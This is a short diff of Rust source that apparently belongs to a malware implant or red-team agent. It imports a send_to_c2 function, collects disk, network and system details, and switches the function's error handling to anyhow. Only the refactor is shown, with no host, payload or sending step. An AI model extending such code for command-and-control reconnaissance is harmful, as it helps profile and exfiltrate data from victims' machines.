@@ -1,9 +1,9 @@
 use crate::connexion::send_to_c2;
+use anyhow::Result;
 use serde_json::json;
-use std::error::Error;
 use sysinfo::{Disks, Networks, System};
 
-pub async fn get_sysinfo() -> Result<(), Box<dyn Error>> {
+pub async fn get_sysinfo() -> Result<()> {
     let mut sys = System::new();
     sys.refresh_all();
 
